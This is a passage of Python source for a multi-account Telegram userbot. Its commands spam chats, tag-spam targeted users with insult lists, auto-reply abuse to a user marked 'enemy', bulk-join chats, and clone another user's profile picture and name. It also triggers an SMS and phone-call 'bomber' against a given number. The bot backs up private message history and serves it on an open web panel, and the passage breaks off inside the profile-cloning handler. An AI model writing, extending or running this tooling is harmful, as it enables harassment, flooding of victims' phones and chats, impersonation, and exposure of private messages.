        msgs = [m for m in backup_manager.messages if m.get('is_private')]
        total = len(msgs)
        outgoing = sum(1 for m in msgs if m.get('is_outgoing'))
        incoming = total - outgoing
        media_count = sum(1 for m in msgs if m.get('media'))
        # Show newest first, limit to 10000 most recent
        msgs = list(reversed(msgs[-10000:]))

    q = request.args.get('q', '').strip()
    if q:
        ql = q.lower()
        def matches(m):
            try:
                if ql in (m.get('text') or '').lower():
                    return True
                if ql in str(m.get('user_name') or '').lower():
                    return True
                if ql in str(m.get('chat_id') or ''):
                    return True
                if m.get('reply_to_user_name') and ql in str(m.get('reply_to_user_name')).lower():
                    return True
                if m.get('reply_to_user_id') and ql in str(m.get('reply_to_user_id')):
                    return True
                if m.get('reply_to_msg_id') and ql in str(m.get('reply_to_msg_id')):
                    return True
                if m.get('media_type') and ql in m.get('media_type').lower():
                    return True
            except Exception:
                return False
            return False
        msgs = [m for m in msgs if matches(m)]

    # Get bot start time
    start_time = "Just now"
    if backup_manager.messages:
        try:
            start_time = backup_manager.bot_start_time
        except:
            pass

    return render_template_string(
        TEMPLATE,
        messages=msgs,
        q=q,
        total=total,
        outgoing=outgoing,
        incoming=incoming,
        media_count=media_count,
        start_time=start_time
    )


@app.route('/export')
def export():
    path = backup_manager.export_txt(os.path.join(BASE_DIR, 'messages_export.txt'))
    if path and os.path.exists(path):
        return send_file(path, as_attachment=True)
    return ('No export file available', 404)


@app.route('/media/<path:filename>')
def media_file(filename):
    # Security: only serve files from media_dir
    safe_path = os.path.normpath(os.path.join(MEDIA_DIR, filename))
    if not safe_path.startswith(os.path.normpath(MEDIA_DIR)):
        return ('Forbidden', 403)
    if os.path.exists(safe_path):
        return send_file(safe_path)
    return ('Not found', 404)


@app.route('/clear', methods=['POST'])
def clear_logs():
    """Clear all logs (only for this session)."""
    with backup_manager.lock:
        backup_manager.messages.clear()
        backup_manager.seen.clear()
        # Also truncate the backup file
        try:
            with open(backup_manager.backup_file, 'w', encoding='utf-8') as f:
                f.write('')
        except:
            pass
    return ('', 204)  # No content


def run_flask():
    try:
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    except Exception:
        pass

# start flask in separate thread
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()



def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


async def spam_loop_all_bots(target, text, speed):
    """Send spam with ALL bots."""
    global SPAM_ACTIVE
    print(f"[SPAM] Loop started. Target: {target}, Text: {text[:30]}...")
    while SPAM_ACTIVE and target:
        for i, client in enumerate(clients):
            if not SPAM_ACTIVE:  # ✅ Check here to stop immediately
                print(f"[SPAM] Stopping mid-loop (bot {i})")
                break
            try:
                await client.send_message(target, text)
                print(f"[SPAM] Bot {i} sent to {target}")
            except FloodWaitError as e:
                print(f"[SPAM] Bot {i} Flood wait: {e.seconds}s")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"[SPAM] Bot {i} Error: {e}")
        if SPAM_ACTIVE:  
            await asyncio.sleep(speed)
    print("[SPAM] Loop ended")


async def on_off_loop_all_bots(chat_id):
    """Send on/off sequence with ALL bots."""
    global ON_OFF_ACTIVE, ON_OFF_SEQUENCE, ON_OFF_DELAY
    while ON_OFF_ACTIVE:
        for item in ON_OFF_SEQUENCE:
            if not ON_OFF_ACTIVE:
                break
            for i, client in enumerate(clients):
                if not ON_OFF_ACTIVE:
                    break
                try:
                    await client.send_message(chat_id, item)
                    print(f"[ON/OFF] Bot {i} Sent: {item}")
                except FloodWaitError as e:
                    print(f"[ON/OFF] Bot {i} Flood wait: {e.seconds}s")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    print(f"[ON/OFF] Bot {i} Error: {e}")
            await asyncio.sleep(ON_OFF_DELAY)
        await asyncio.sleep(0)


async def tag_spam_all_bots_loop(chat_id: int):
    """Send fosh messages with all tag mentions using ALL bots."""
    global TAG_SPAM_ACTIVE, TAG_TARGETS, TAG_SPAM_DELAY, FOSHLIST, TAG_SYMBOL, clients
    while TAG_SPAM_ACTIVE and clients and chat_id:
        if not FOSHLIST:
            print("[TAG SPAM] No fosh messages available.")
            await asyncio.sleep(5)
            continue
        if not TAG_TARGETS:
            print("[TAG SPAM] No targets set.")
            await asyncio.sleep(5)
            continue

        fosh_text = random.choice(FOSHLIST)

        mentions = "\n".join(
            f"<a href='tg://user?id={uid}'>{TAG_SYMBOL}</a>"
            for uid in TAG_TARGETS
        )

        full_message = f"{fosh_text}\n\n{mentions}"

        for i, client in enumerate(clients):
            if not TAG_SPAM_ACTIVE:
                break
            try:
                await client.send_message(chat_id, full_message, parse_mode='html')
                print(f"[TAG SPAM] Bot {i} sent with {len(TAG_TARGETS)} tag(s)")
            except FloodWaitError as e:
                print(f"[TAG SPAM] Bot {i} Flood wait: {e.seconds}s")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"[TAG SPAM] Bot {i} Error: {e}")

        await asyncio.sleep(TAG_SPAM_DELAY)


async def forward_spam_all_bots():
    """Forward spam with ALL bots."""
    global FORWARD_SPAM_ACTIVE
    print("[FWD SPAM] Started ")
    ensure_forward_files()
    while FORWARD_SPAM_ACTIVE:
        try:
            target_id = SPAM_TARGET
            if not target_id:
                target_id = int(read_forward_file(TARGET_ID_FILE, "1") or "1")

            source_channel = read_forward_file(FWD_SOURCE_CHANNEL_FILE)
            source_msg_id = int(read_forward_file(FWD_SOURCE_MSG_ID_FILE, "0"))
            delay_min = float(read_forward_file(FWD_DELAY_MIN_FILE, "3"))
            delay_max = float(read_forward_file(FWD_DELAY_MAX_FILE, "10"))
            extra_text = read_forward_file(FWD_EXTRA_TEXT_FILE)
            extra_pos = read_forward_file(FWD_EXTRA_POSITION_FILE, "after").lower()
        except Exception as e:
            print(f"[FWD SPAM] Config read error: {e}")
            await asyncio.sleep(5)
            continue

        if not target_id or target_id == 1:
            print("[FWD SPAM] No target set. Use setid <chatid> first.")
            FORWARD_SPAM_ACTIVE = False
            break

        if not source_channel or source_msg_id == 0:
            print("[FWD SPAM] No source set. Use setfwd <message_link>")
            FORWARD_SPAM_ACTIVE = False
            break

        try:
            source_message = await MASTER_CLIENT.get_messages(source_channel, ids=source_msg_id)
            if not source_message:
                print(f"[FWD SPAM] Message {source_msg_id} not found in {source_channel}")
                FORWARD_SPAM_ACTIVE = False
                break

            for i, client in enumerate(clients):
                if not FORWARD_SPAM_ACTIVE:
                    break
                try:
                    await client.forward_messages(target_id, source_message)
                    print(f"[FWD SPAM] Bot {i} forwarded to {target_id}")
                except FloodWaitError as e:
                    print(f"[FWD SPAM] Bot {i} Flood wait: {e.seconds}s")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    print(f"[FWD SPAM] Bot {i} Error: {e}")

            if extra_text:
                if extra_pos == "before":
                    for i, client in enumerate(clients):
                        if not FORWARD_SPAM_ACTIVE:
                            break
                        try:
                            await client.send_message(target_id, f"{extra_text}\n\n")
                        except Exception as e:
                            print(f"[FWD SPAM] Bot {i} extra text error: {e}")
                else:
                    for i, client in enumerate(clients):
                        if not FORWARD_SPAM_ACTIVE:
                            break
                        try:
                            await client.send_message(target_id, f"\n\n{extra_text}")
                        except Exception as e:
                            print(f"[FWD SPAM] Bot {i} extra text error: {e}")

            delay = random.uniform(delay_min, delay_max)
            await asyncio.sleep(delay)

        except FloodWaitError as e:
            print(f"[FWD SPAM] Flood wait: {e.seconds}s")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"[FWD SPAM] Error: {e}")
            await asyncio.sleep(5)


async def send_loading_animation(event):
    """Send a loading animation with progress bar effect."""
    loading_steps = [
        " [          ] 0%",
        " [█         ] 10%",
        " [██        ] 20%",
        " [███       ] 30%",
        " [████      ] 40%",
        " [█████     ] 50%",
        " [██████    ] 60%",
        " [███████   ] 70%",
        " [████████  ] 80%",
        " [█████████ ] 90%",
        " [██████████] 100%",
        " LOADING COMPLETE"
    ]
    loading_msg = await event.reply(" Loading...\n" + loading_steps[0])
    for i in range(1, len(loading_steps)):
        await asyncio.sleep(0.3)
        try:
            await loading_msg.edit(f" Loading...\n{loading_steps[i]}")
        except:
            break
    await asyncio.sleep(0.3)
    try:
        await loading_msg.delete()
    except:
        pass


def save_fosh_file():
    try:
        with open(FOSH_FILE, "w", encoding="utf-8") as f:
            for item in FOSHLIST:
                f.write(item.strip() + "\n")
    except Exception as e:
        print(f"[ERROR] Could not save {FOSH_FILE}: {e}")


def normalize_join_target(raw: str) -> Optional[str]:
    if not raw:
        return None

    target = raw.strip()
    if not target:
        return None

    if target.startswith("@"):
        return target[1:]

    target = target.replace("https://", "").replace("http://", "")
    target = target.replace("t.me/", "", 1).replace("telegram.me/", "", 1)
    target = target.split("?", 1)[0].split("#", 1)[0].strip("/")

    if not target:
        return None

    if target.lower().startswith("joinchat/"):
        return target[len("joinchat/"):]

    if target.startswith("+"):
        return target

    if target.lower().startswith("joinchat"):
        return target[len("joinchat"):]

    if "/" in target:
        first_part = target.split("/", 1)[0]
        if first_part.lower() in {"joinchat", "addlist", "s"}:
            return target.split("/", 1)[1]
        return first_part

    return target


def looks_like_invite_hash(target: str) -> bool:
    if not target:
        return False
    return target.lower().startswith("joinchat") or target.startswith("+")


def ensure_forward_files():
    os.makedirs(BOT_DIR, exist_ok=True)
    files_defaults = {
        TARGET_ID_FILE: "1",
        FWD_SOURCE_CHANNEL_FILE: "",
        FWD_SOURCE_MSG_ID_FILE: "0",
        FWD_DELAY_MIN_FILE: "3",
        FWD_DELAY_MAX_FILE: "10",
        FWD_EXTRA_TEXT_FILE: "",
        FWD_EXTRA_POSITION_FILE: "after",
    }
    for path, value in files_defaults.items():
        if not os.path.exists(path):
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(value)
            except Exception as e:
                print(f"[ERROR] Could not create {path}: {e}")


def read_forward_file(path: str, default: str = "") -> str:
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip() or default
    except Exception:
        return default


async def fetch_old_messages(client):
    """Fetch historical messages from all personal dialogs and back them up."""
    try:
        async for dialog in client.iter_dialogs():
            try:
                if getattr(dialog, 'is_user', False):
                    async for msg in client.iter_messages(dialog.entity, limit=None):
                        try:
                            await backup_manager.save_message(client, msg, is_outgoing=False)
                        except Exception:
                            pass
                        await asyncio.sleep(0)
            except Exception:
                continue
    except Exception as e:
        print(f"[BACKUP] fetch_old_messages error: {e}")


async def handle_all_messages(event):
    global ADMIN_IDS, FOSHLIST, SPAM_TARGET, SPAM_TEXT, SPAM_ACTIVE, SPAM_SPEED, SPAM_TASK
    global ON_OFF_ACTIVE, ON_OFF_TASK, ENEMY_TARGET, ENEMY_ACTIVE, REPLY_TO_ENEMY, ORIGINAL_NAME, ORIGINAL_PHOTO, FORWARD_SPAM_ACTIVE, FORWARD_SPAM_TASK
    global TAG_TARGETS, TAG_SPAM_ACTIVE, TAG_SPAM_TASK, TAG_SPAM_DELAY, TAG_SPAM_CHAT_ID, TAG_SYMBOL
    global MASTER_CLIENT

    client_instance = event.client
    # Determine sender: account for outgoing (own) messages so the bot can "see" its own messages
    try:
        me = await client_instance.get_me()
    except Exception:
        me = None

    # Telethon marks outgoing messages with event.out or event.message.out
    is_outgoing = getattr(event, 'out', False) or getattr(getattr(event, 'message', None), 'out', False)
    if is_outgoing and me:
        user_id = me.id
    else:
        user_id = event.sender_id
    
    if ENEMY_ACTIVE and REPLY_TO_ENEMY and FOSHLIST:
        if user_id == ENEMY_TARGET:
            reply_text = random.choice(FOSHLIST)
            await asyncio.sleep(0.5)
            try:
                await event.reply(reply_text)
                print(f"[BOT] Enemy reply sent to {user_id}")
            except Exception as e:
                print(f"[ERROR] Enemy reply failed: {e}")
            return
    
    if not event.message or not event.message.text:
        return
    
    raw_text = event.message.text.strip() if event.message.text else ""
    text = raw_text.lower()

    # Save incoming/outgoing message to backup
    try:
        await backup_manager.save_message(client_instance, event.message, is_outgoing=is_outgoing)
    except Exception:
        pass

    if text == "stopbomb":
        if user_id not in ADMIN_IDS:
            return
        bomber_instance.stop()
        await event.reply("✡ attck stop ✡ ")
        return

    if text.startswith("bomb"):
        if user_id not in ADMIN_IDS:
            return

        parts = raw_text.split()
        if len(parts) < 2:
            await event.reply(
                " *SMS/CALL BOMBER*\n\n"
                "Usage: `bomb <phone>` - SMS only\n"
                "`bomb <phone> all` - Both SMS and Call\n"
                "`bomb <phone> call` - Call only\n\n"
                "*Example:* `bomb 9123456789 all`\n\n"
                "Developer by @DevilWillCryBitch",
                parse_mode='Markdown'
            )
            return

        phone = parts[1].strip()
        attack_type = "sms"

        if len(parts) > 2:
            attack_type = parts[2].lower()
            if attack_type not in ["sms", "call", "all"]:
                attack_type = "sms"

        if not phone.isdigit() or len(phone) != 10:
            await event.reply(
                " Invalid phone number Enter without 0. Example: `9123456789` or make sure number is right ",
                parse_mode='Markdown'
            )
            return

        await event.reply(
            f" sms attck start  `0{phone}`\n"
            f"use stopbomb for stop it if u want ",
            parse_mode='Markdown'
        )

        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, bomber_instance.run_attack, phone, attack_type, 20)

            message = "COMPLETE\n\n"
            message += f" Target: `0{phone}`\n"
            message += f" Successful: {result['success']}\n"
            message += f" developer by @DevilWillCryBitch\n"

            await event.reply(message, parse_mode='Markdown')
        except Exception as e:
            await event.reply(f" Error: {str(e)}")
        return

    if event.is_reply and raw_text:
        if user_id in ADMIN_IDS:
            if not text.startswith((
                "help", "راهنما", "help2", "on", "off", "spam", "spamoff", "setfosh ",
                "speed ", "id", "setid ", "setfwd ", "setfwd_delay ", "setfwd_text ",
                "setfwd_pos ", "fspam_on", "fspam_off", "showfwd", "join ",
                "addfosh", "listfosh", "removefosh ", "setenemy", "enemyoff", "setreply ",
                "copy ", "back", "ping", "status", "sudo su", "kiladmin",
                "bitch ", "time ", "start", "stop", "stopbomb", "set "
            )):
                trailing_match = re.match(r"^(.*?)(?:\s+)?(\d+)\s*$", raw_text)
                if trailing_match:
                    message_text = trailing_match.group(1).strip()
                    count = int(trailing_match.group(2))
                    if message_text and count > 0:
                        reply_to_id = event.message.reply_to_msg_id or event.message.id
                        try:
                            for _ in range(count):
                                await client_instance.send_message(event.chat_id, message_text, reply_to=reply_to_id)
                                await asyncio.sleep(0.1)
                        except Exception as e:
                            print(f"[ERROR] Repeat reply failed: {e}")
                        return

    if user_id not in ADMIN_IDS:
        print(f"[BOT] Ignored non-admin message from {user_id}")
        return
    
    if event.is_private:
        location = "PRIVATE"
    elif event.is_group:
        location = "GROUP"
    elif event.is_channel:
        location = "CHANNEL"
    else:
        location = "UNKNOWN"
    
    print(f"[BOT] Admin {user_id} in {location}: {text[:50]}")
    
    
    if text == "help" or text == "راهنما":
        await send_loading_animation(event)
        help_text = """
````𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈
>spam - Start spam
>spamoff - Stop spam
>setfosh <text> - the message that u want to spam 
> addbitch - reply on user u want to add in bitch list 
> clearbitch confirm - clear all of id from bitch list 
> removebitch - if u want remove just one guy u can use it 
>speed <1-60> - Set speed
>id - Get chat ID
>setid <chat_id> - Set target
>join <link> - Join link
>bot - Check bot
>help2
Development by @DevilWillCryBitch````
"""
        try:
            await client_instance.send_file(
                event.chat_id,
                HELP_IMAGE_URL,
                caption=help_text,
                reply_to=event.message.id,
            )
        except Exception as e:
            print(f"[ERROR] Help media send failed: {e}")
            try:
                await client_instance.send_message(event.chat_id, help_text, reply_to=event.message.id)
            except Exception as fallback_error:
                print(f"[ERROR] Help text fallback failed: {fallback_error}")
        return

    if text == "help2":
        await send_loading_animation(event)
        help_text = """ 
```` 𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈
> sudo su <user id> - Add admin 
> kiladmin <user id> - Remove admin
> copy @user - copy profile
> back - Restore original profile
> on - Start number fight 
> off - Stop number fight 
> setenemy - Mark user as enemy 
> enemyoff - Remove user from enemy list
> listfosh - Show the fosh list
> addfosh - Add fosh (reply to message)
> removefosh <index> - Remove fosh
> bitch <user id> - Set any usertag that u want to show up from ur target 
> set <symbol> - Set tag symbol
> time <seconds> - Set delay (1-60s)
> start - spam with your chose id  
> add bitch - reply on user u want to add in bitch list 
> stop - Stop (start)
> bomb <phone> - sms attck and call attck 
> stop bomb - Stop attck
> Development by @DevilWillCryBitch````
"""
        try:
            await client_instance.send_file(
                event.chat_id,
                HELP_IMAGE_URL,
                caption=help_text,
                reply_to=event.message.id,
            )
        except Exception as e:
            print(f"[ERROR] Help2 media send failed: {e}")
            try:
                await client_instance.send_message(event.chat_id, help_text, reply_to=event.message.id)
            except Exception as fallback_error:
                print(f"[ERROR] Help2 text fallback failed: {fallback_error}")
        return

    # ON/OFF (ALL BOTS)
    if text == "on":
        if not ON_OFF_ACTIVE:
            ON_OFF_ACTIVE = True
            if ON_OFF_TASK and not ON_OFF_TASK.done():
                ON_OFF_TASK.cancel()
            ON_OFF_TASK = asyncio.create_task(on_off_loop_all_bots(event.chat_id))
            await event.reply(f"ON start {len(clients)} ")
        return

    if text == "off":
        if ON_OFF_ACTIVE:
            ON_OFF_ACTIVE = False
            if ON_OFF_TASK and not ON_OFF_TASK.done():
                ON_OFF_TASK.cancel()
            await event.reply("OFF stopped")
        return

    # SPEED
    if text.startswith("speed "):
        try:
            new_speed = float(text[6:].strip())
            if 1 <= new_speed <= 60:
                SPAM_SPEED = new_speed
                print(f" ⧽ Spam speed changed to {SPAM_SPEED}s")
                await event.reply(f"Speed set to {SPAM_SPEED} seconds")
        except ValueError:
            pass
        return  

    # SPAM (ALL BOTS)
    if text == "spam":
        print(f"[DEBUG] Spam run ☮ {SPAM_ACTIVE}")

        # Check if SPAM_TEXT is set
        if not SPAM_TEXT or SPAM_TEXT == "":
            await event.reply("愛 No spam text set! Use: setfosh <your message> 愛")
            return

        if not SPAM_TARGET:
            await event.reply("╰┈➤ No target chat set. Use: setid <chat_id> ")
            return

        if SPAM_ACTIVE:
            await event.reply("☘ Spam is already running. Use spamoff to stop ☘")
            return

        SPAM_ACTIVE = True
        await event.reply(
            f" SPAM STARTED\n"
            f"━━━━━━━━━━━━━━━\n"
            f"{len(clients)}\n"
            f" ☘ Target {SPAM_TARGET}\n"
            f" ☘  Text: {SPAM_TEXT[:50]}...\n"
            f" ☘   Speed: {SPAM_SPEED} seconds\n"
            f"━━━━━━━━━━━━━━━\n"
            f" Use 'spamoff' to stop ♱"
        )

        if SPAM_TASK and not SPAM_TASK.done():
            SPAM_TASK.cancel()
        SPAM_TASK = asyncio.create_task(spam_loop_all_bots(SPAM_TARGET, SPAM_TEXT, SPAM_SPEED))
        return

    if text == "spamoff":
        print(f"[DEBUG] spamoff received. SPAM_ACTIVE={SPAM_ACTIVE}")
        if SPAM_ACTIVE:
            SPAM_ACTIVE = False
            if SPAM_TASK and not SPAM_TASK.done():
                SPAM_TASK.cancel()
                print("[DEBUG] Spam task cancelled")
            await event.reply("˗ˏˋ ✞ ˎˊ˗ SPAM STOPPED ˗ˏˋ ✞ ˎˊ˗")
        else:
            await event.reply(" Spam is not active")
        return

    # SETFOSH
    if text.startswith("setfosh "):
        SPAM_TEXT = text[8:].strip()
        await event.reply(f"Spam text set to: {SPAM_TEXT}")
        return

    # ID
    if text == "id":
        chat_id = event.chat_id
        chat_type = "† Private †" if event.is_private else "† Group †" if event.is_group else "† Channel †"
        await event.reply(f"ID {chat_id}\nType: {chat_type}")
        return

    # SETID
    if text.startswith("setid "):
        try:
            SPAM_TARGET = int(text[6:].strip())
            await event.reply(f"† Target set to {SPAM_TARGET}")
            try:
                with open(TARGET_ID_FILE, "w", encoding="utf-8") as f:
                    f.write(str(SPAM_TARGET))
            except Exception as e:
                print(f"[ERROR] Could not save target ID file: {e}")
        except ValueError:
            await event.reply("Invalid chat ID. Must be a number.")
        return

    # SETFWD
    if text.startswith("setfwd "):
        link = text[7:].strip()
        if not link:
            await event.reply("Usage: setfwd <message_link>")
            return
        try:
            cleaned = link.replace("https://", "").replace("http://", "").replace("t.me/", "").replace("telegram.me/", "")
            parts = cleaned.split("/")
            if len(parts) >= 3 and parts[0].lower() == "c":
                channel = str(int("-100" + parts[1]))
                msg_id = int(parts[2])
            elif len(parts) >= 2:
                channel = parts[0]
                msg_id = int(parts[1])
            else:
                await event.reply("Invalid setfwd link. Use a t.me link with message ID.")
                return
            with open(FWD_SOURCE_CHANNEL_FILE, "w", encoding="utf-8") as f:
                f.write(channel)
            with open(FWD_SOURCE_MSG_ID_FILE, "w", encoding="utf-8") as f:
                f.write(str(msg_id))
            await event.reply(f"Source set\nChannel: {channel}\nMessage ID: {msg_id}")
        except Exception as e:
            await event.reply(f"Failed to parse link: {e}")
        return

    # SETFWD_DELAY
    if text.startswith("setfwd_delay "):
        try:
            parts = text.split()
            min_d = float(parts[1])
            max_d = float(parts[2]) if len(parts) > 2 else min_d + 1
            if min_d < 0.5:
                min_d = 0.5
            if max_d < min_d:
                max_d = min_d + 1
            with open(FWD_DELAY_MIN_FILE, "w", encoding="utf-8") as f:
                f.write(str(min_d))
            with open(FWD_DELAY_MAX_FILE, "w", encoding="utf-8") as f:
                f.write(str(max_d))
            await event.reply(f"Delay: {min_d}-{max_d} seconds")
        except Exception:
            await event.reply("Usage: setfwd_delay <min> <max>")
        return

    # SETFWD_TEXT
    if text.startswith("setfwd_text "):
        extra_text = text[12:].strip()
        with open(FWD_EXTRA_TEXT_FILE, "w", encoding="utf-8") as f:
            f.write(extra_text)
        await event.reply("Extra text set")
        return

    # SETFWD_POS
    if text.startswith("setfwd_pos "):
        pos = text[11:].strip().lower()
        if pos not in ["before", "after"]:
            await event.reply("Usage: setfwd_pos before or setfwd_pos after")
            return
        with open(FWD_EXTRA_POSITION_FILE, "w", encoding="utf-8") as f:
            f.write(pos)
        await event.reply(f"Position: {pos}")
        return

    # FSPAM (ALL BOTS)
    if text == "fspam_on":
        if FORWARD_SPAM_ACTIVE:
            await event.reply("Forward spam is already running.")
            return
        FORWARD_SPAM_ACTIVE = True
        if FORWARD_SPAM_TASK and not FORWARD_SPAM_TASK.done():
            FORWARD_SPAM_TASK.cancel()
        FORWARD_SPAM_TASK = asyncio.create_task(forward_spam_all_bots())
        await event.reply(f"FWD SPAM RUNNING with ALL {len(clients)} bots")
        return

    if text == "fspam_off":
        if FORWARD_SPAM_ACTIVE:
            FORWARD_SPAM_ACTIVE = False
            if FORWARD_SPAM_TASK and not FORWARD_SPAM_TASK.done():
                FORWARD_SPAM_TASK.cancel()
            await event.reply("FWD SPAM STOPPED")
        else:
            await event.reply("Forward spam is not running.")
        return

    # SHOWFWD
    if text == "showfwd":
        source = read_forward_file(FWD_SOURCE_CHANNEL_FILE)
        msg_id = read_forward_file(FWD_SOURCE_MSG_ID_FILE, "0")
        min_delay = read_forward_file(FWD_DELAY_MIN_FILE, "3")
        max_delay = read_forward_file(FWD_DELAY_MAX_FILE, "10")
        target = SPAM_TARGET or int(read_forward_file(TARGET_ID_FILE, "1") or "1")
        status = "RUNNING" if FORWARD_SPAM_ACTIVE else "STOPPED"
        await event.reply(f"Forward Config - {status}\nTARGET: {target}\nSOURCE: {source}/{msg_id}\nDELAY: {min_delay}-{max_delay} seconds")
        return

    # JOIN (ALL BOTS) - FIXED
    if text.startswith("join "):
        invite_input = raw_text[5:].strip()
        if not invite_input:
            await event.reply("Usage: join <invite_link> or join @channelname")
            return

        if MASTER_CLIENT is None:
            await event.reply(" Master client not initialized!")
            return

        # Clean the input
        invite_input = invite_input.strip()
        
        # Check if it's a private invite (starts with + or contains joinchat)
        is_private = False
        target = invite_input
        
        # Extract hash from various invite formats
        if "joinchat/" in invite_input:
            target = invite_input.split("joinchat/")[-1].split("?")[0].strip("/")
            is_private = True
        elif invite_input.startswith("+"):
            target = invite_input.strip()
            is_private = True
        elif "t.me/+" in invite_input:
            target = invite_input.split("t.me/+")[-1].split("?")[0].strip("/")
            is_private = True
        else:
            target = normalize_join_target(invite_input)
            if not target:
                await event.reply("Invalid invite link.")
                return

        try:
            entity = None
            
            if is_private:
                try:
                    await event.reply("──── Loading ────")
                    result = await MASTER_CLIENT(ImportChatInviteRequest(target))
                    if result and hasattr(result, 'chats') and result.chats:
                        entity = result.chats[0]
                        await event.reply(f" Private invite accepted! Chat: {getattr(entity, 'title', 'Unknown')}")
                    else:
                        await event.reply("──── it join ────")
                        return
                except Exception as e:
                    error_msg = str(e)
                    if "already" in error_msg.lower():
                        await event.reply(" Already a member of this chat")
                        return
                    await event.reply(f" Failed to join private invite: {error_msg[:100]}")
                    return
            else:
                try:
                    await event.reply(" Finding public channel...")
                    entity = await MASTER_CLIENT.get_entity(target)
                except Exception as e:
                    await event.reply(f" Could not find channel: {str(e)[:100]}")
                    return

            if not entity:
                await event.reply("Could not find the channel/group.")
                return

            # Join with all clients
            joined_count = 0
            for i, client in enumerate(clients):
                try:
                    if is_private:
                        await client(ImportChatInviteRequest(target))
                    else:
                        await client(JoinChannelRequest(entity))
                    joined_count += 1
                    print(f"[JOIN] Client {i} joined {invite_input}")
                    await asyncio.sleep(0.5)
                except UserAlreadyParticipantError:
                    joined_count += 1
                    print(f"[JOIN] Client {i} already joined")
                except FloodWaitError as e:
                    print(f"[JOIN] Client {i} flood wait: {e.seconds}s")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    print(f"[JOIN] Client {i} error: {e}")

            await event.reply(f" {joined_count}/{len(clients)} clients joined successfully")
        except Exception as e:
            await event.reply(f" Failed to join: {str(e)[:200]}")
        return

    # ADDFOSH - moved to commands handler
    await _commands_handler(event, text, client_instance)

try:
    with open(FOSH_FILE, "r", encoding="utf-8") as f:
        FOSHLIST: List[str] = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    FOSHLIST: List[str] = [
        "بیا پایین",
        "کصخل",
        "برو گمشو"
    ]
    print("fosh.txt not found. Using default fosh list.")


async def _commands_handler(event, text, client):
    global ADMIN_IDS, FOSHLIST, ENEMY_TARGET, ENEMY_ACTIVE, REPLY_TO_ENEMY, ORIGINAL_NAME, ORIGINAL_PHOTO
    global TAG_TARGETS, TAG_SPAM_ACTIVE, TAG_SPAM_TASK, TAG_SPAM_DELAY, TAG_SPAM_CHAT_ID, TAG_SYMBOL
    user_id = event.sender_id

    # ADDFOSH
    if text == "addfosh":
        if not event.is_reply:
            await event.reply("Reply to a message and type addfosh")
            return

        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.text:
            await event.reply("The replied message has no text.")
            return

        FOSHLIST.append(replied_msg.text)
        save_fosh_file()
        await event.reply(
            f"Fosh added (Index #{len(FOSHLIST)-1})\n"
            f"Preview: {replied_msg.text[:50]}..."
        )
        return

    # LISTFOSH
    if text == "listfosh":
        if not FOSHLIST:
            await event.reply("Foshlist is empty. Use addfosh to fill it.")
            return
        lines = []
        for i, item in enumerate(FOSHLIST):
            snippet = item.replace("\n", " ")[:60]
            lines.append(f"{i}: {snippet}...")
        msg = "FOSHLIST (index to use with removefosh):\n" + "\n".join(lines[:20])
        if len(lines) > 20:
            msg += f"\n... and {len(lines)-20} more."
        await event.reply(msg)
        return

    # REMOVEFOSH
    if text.startswith("removefosh "):
        try:
            idx = int(text[11:].strip())
            if idx < 0 or idx >= len(FOSHLIST):
                await event.reply("Index out of range.")
                return
            removed = FOSHLIST.pop(idx)
            save_fosh_file()
            await event.reply(f"Removed fosh {idx}:\n{removed[:50]}...")
        except ValueError:
            await event.reply("Invalid index. Must be a number.")
        return

    # SETENEMY
    if text == "setenemy":
        if not event.is_reply:
            await event.reply("Reply to a message to mark as enemy.")
            return

        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.sender_id:
            await event.reply("Could not identify the user.")
            return

        target_user = await client.get_entity(replied_msg.sender_id)
        ENEMY_TARGET = target_user.id
        ENEMY_ACTIVE = True
        await event.reply(
            f"╋━ Enemy set: @{target_user.username or target_user.first_name or 'Unknown'}\n"
            f"╋━ ID: {ENEMY_TARGET}"
        )
        return

    # ENEMYOFF
    if text == "enemyoff":
        if ENEMY_ACTIVE:
            ENEMY_ACTIVE = False
            await event.reply("⍀ Enemy mode off ⍀")
        else:
            await event.reply("⍀ Enemy mode is already off ⍀")
        return

    # SETREPLY
    if text.startswith("setreply "):
        mode = text[9:].strip().lower()
        if mode not in ["on", "off"]:
            await event.reply("Usage: setreply on or setreply off")
            return
        REPLY_TO_ENEMY = mode == "on"
        await event.reply(f"Auto-reply set to: {REPLY_TO_ENEMY}")
        return
    
    # COPY
    if text.startswith("copy "):
        target_identifier = text[6:].strip()
        if target_identifier.startswith("@"):
            target_identifier = target_identifier[1:]
        
        await event.reply(f"Searching for user {target_identifier}...")
        
        try:
            try:
                target_user = await client.get_entity(target_identifier)
            except:
                if target_identifier.isdigit():
                    try:
                        target_user = await client.get_entity(int(target_identifier))
                    except:
                        target_user = None
                else:
                    target_user = None
            
            if not target_user and event.is_reply:
                replied_msg = await event.get_reply_message()
                if replied_msg and replied_msg.sender_id:
                    target_user = await client.get_entity(replied_msg.sender_id)
            
            if not target_user:
                await event.reply("Could not find user.")
                return
            
            me = await client.get_me()
            if not ORIGINAL_NAME:
                ORIGINAL_NAME = me.first_name or ""
            
            if not ORIGINAL_PHOTO:
                try:
                    photos = await client.get_profile_photos(me, limit=1)
                    if photos:
                        ORIGINAL_PHOTO = photos[0]
                except:
                    pass
            
            await event.reply(f"Cloning {target_user.first_name or 'Unknown'}...")
            
            try:
                photos = await client.get_profile_photos(target_user, limit=1)
                if photos:
                    photo = photos[0]
                    photo_path = await client.download_media(photo, file="temp_profile.jpg")
                    if photo_path:
                        await client(UploadProfilePhotoRequest(
                            file=await client.upload_file(photo_path)
                        ))
                        await event.reply("Profile picture cloned successfully")
                        try:
                            os.remove(photo_path)
                        except:
                            pass
            except Exception as e:
